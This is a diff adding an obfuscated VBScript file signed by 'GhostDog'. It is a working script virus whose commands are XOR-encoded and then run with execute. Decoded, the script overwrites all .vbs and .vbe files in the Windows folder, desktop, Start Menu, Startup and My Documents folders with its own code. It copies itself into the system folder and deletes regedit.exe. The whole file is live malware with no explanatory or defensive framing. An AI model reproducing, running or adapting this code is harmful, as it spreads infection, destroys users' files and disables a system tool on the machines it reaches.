@@ -1,0 +1,72 @@
+'Crypted by GhostDog
+'you can mail me to: GhostDog@EveryMail.net
+function QLPHN(QPLFVL,NVNFUOA)
+for TQRQ=1 to len(QPLFVL)
+QLPHN=QLPHN&cstr(chr(asc(mid(QPLFVL,TQRQ,1))xor NVNFUOA))
+next
+end function
+FSKFFEMS=FSKFFEMS&QLPHN(""Fw`dq`a%g|%BmjvqAjb",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Jk%@wwjw%W`vph`%K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`q%C%8%Fw`dq`Jgo`fq-'Vfwluqlkb+Cli`V|vq`hJgo`fq',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`q%R%8%Fw`dq`Jgo`fq-'Rvfwluq+Vm`ii',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`q%Ju`kV`ic%8%C+Ju`kQ`}qCli`-Rvfwluq+VfwluqCpiiKdh`)%4,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`ic%8%Ju`kV`ic+W`dadii",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`q%Rcjia`w%8%C+B`qVu`fldiCjia`w-5,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjw%`dfm%C4%lk%Rcjia`w+Cli`v",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@}qKdh`%8%C+B`q@}q`kvljkKdh`-C4+udqm,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%Lc%-@}qKdh`8'sgv',%jw%-@}qKdh`8'sg`',%qm`k",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%V`q%JC%8%C+Ju`kQ`}qCli`-C4+udqm)%7)%Qwp`,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC+Rwlq`Ilk`%V`ic",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC+Fijv`",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@ka%Lc",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjia`w4%8%R+Vu`fldiCjia`wv-'DiiPv`wvA`vnqju',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjw%@dfm%Cli`v4%lk%Cjia`w4",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@}qKdh`4%8%C+B`q@}q`kvljkKdh`-Cli`v4+udqm,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%Lc%-@}qKdh`4%8%'sgv',%jw%-@}qKdh`4%8%'sg`',%qm`k",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%V`q%JC4%8%C+Ju`kQ`}qCli`-Cli`v4+udqm)%7)%Qwp`,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC4+Rwlq`Ilk`%V`ic",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC4+Fijv`",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@ka%Lc",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjia`w7%8%R+Vu`fldiCjia`wv-'DiiPv`wvVqdwqH`kp',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjw%@dfm%Cli`v7%lk%Cjia`w7",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@}qKdh`7%8%C+B`q@}q`kvljkKdh`-Cli`v7+udqm,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%Lc%-@}qKdh`7%8%'sgv',%jw%-@}qKdh`7%8%'sg`',%qm`k",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%V`q%JC7%8%C+Ju`kQ`}qCli`-Cli`v7+udqm)%7)%Qwp`,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC7+Rwlq`Ilk`%V`ic",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC7+Fijv`",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@ka%Lc",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjia`w6%8%R+Vu`fldiCjia`wv-'DiiPv`wvUwjbwdhv',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjw%@dfm%Cli`v6%lk%Cjia`w6",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@}qKdh`6%8%C+B`q@}q`kvljkKdh`-Cli`v6+udqm,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%Lc%-@}qKdh`6%8%'sgv',%jw%-@}qKdh`6%8%'sg`',%qm`k",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%V`q%JC6%8%C+Ju`kQ`}qCli`-Cli`v7+udqm)%6)%Qwp`,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC6+Rwlq`Ilk`%V`ic",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC6+Fijv`",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@ka%Lc",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjia`w1%8%R+Vu`fldiCjia`wv-'DiiPv`wvVqdwqpu',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjw%@dfm%Cli`v1%lk%Cjia`w1",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@}qKdh`1%8%C+B`q@}q`kvljkKdh`-Cli`v1+udqm,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%Lc%-@}qKdh`1%8%'sgv',%jw%-@}qKdh`1%8%'sg`',%qm`k",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%V`q%JC1%8%C+Ju`kQ`}qCli`-Cli`v1+udqm)%6)%Qwp`,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC1+Rwlq`Ilk`%V`ic",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC1+Fijv`",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@ka%Lc",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjia`w0%8%R+Vu`fldiCjia`wv-'H|Ajfph`kqv',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("Cjw%@dfm%Cli`v0%lk%Cjia`w0",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@}qKdh`0%8%C+B`q@}q`kvljkKdh`-Cli`v0+udqm,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%Lc%-@}qKdh`0%8%'sgv',%jw%-@}qKdh`0%8%'sg`',%qm`k",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%V`q%JC0%8%C+Ju`kQ`}qCli`-Cli`v0+udqm)%6)%Qwp`,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC0+Rwlq`Ilk`%V`ic",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%%%JC0+Fijv`",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("%@ka%Lc",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("K`}q",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`q%V|vcjia`w%8%C+B`qVu`fldiCjia`w-4,",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("C+Fju|Cli`%Rvfwluq+VfwluqCpiiKdh`)%V|vcjia`w%#%'YH`vpq+sgv'",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("V`q%W`b`alq%8%C+B`qCli`-Rcjia`w%#%'Yw`b`alq+`}`',",05)&VbCrLf
+FSKFFEMS=FSKFFEMS&QLPHN("W`b`alq+A`i`q`",05)&VbCrLf
+execute FSKFFEMS
